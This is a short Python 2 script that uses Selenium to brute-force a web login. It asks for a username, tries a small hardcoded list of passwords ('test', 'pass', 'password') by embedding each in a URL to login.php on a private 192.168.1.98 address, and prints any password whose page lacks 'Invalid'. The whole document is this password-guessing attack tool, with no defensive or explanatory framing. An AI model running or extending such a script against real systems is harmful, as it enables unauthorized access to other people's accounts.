#Python2, venv and selenium required. 

import unittest
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

user = raw_input('Enter a username:')
passwords = ['test', 'pass', 'password'] #Read list of passwords from file? 


for password in passwords: 
    driver = webdriver.Firefox()

    authString = 'http://' + user + ':' + password + '@192.168.1.98/login.php'
    print(authString)
    driver.get(authString)
    
    if 'Invalid' in driver.page_source:
        pass
    else:
        print('Password found: ' + password)
    
    
    driver.close()
